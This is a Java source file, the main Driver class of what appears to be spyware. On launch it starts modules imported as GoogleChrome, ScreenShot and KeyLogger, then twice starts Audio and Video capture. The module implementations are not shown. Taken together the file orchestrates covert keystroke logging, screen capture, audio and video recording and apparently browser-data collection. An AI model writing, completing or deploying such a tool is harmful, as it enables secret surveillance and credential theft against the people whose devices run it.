package application.driver;

import application.audio.Audio;
import application.googlechrome.GoogleChrome;
import application.keylogger.KeyLogger;
import application.screenshots.ScreenShot;
import application.video.Video;

public class Driver {
	private int counter;
	
	public Driver() {
		this.counter = 1;
		int loopCounter = 1;
		
		new GoogleChrome();
		new ScreenShot();
		new KeyLogger();
		
		while (loopCounter <= 2) {
    		new Audio(this.counter);
        	new Video(this.counter);
        	
        	this.counter += 1;
        	loopCounter += 1;
    	}
	}
	
    public static void main(String[] args) {
    	new Driver();
    }
}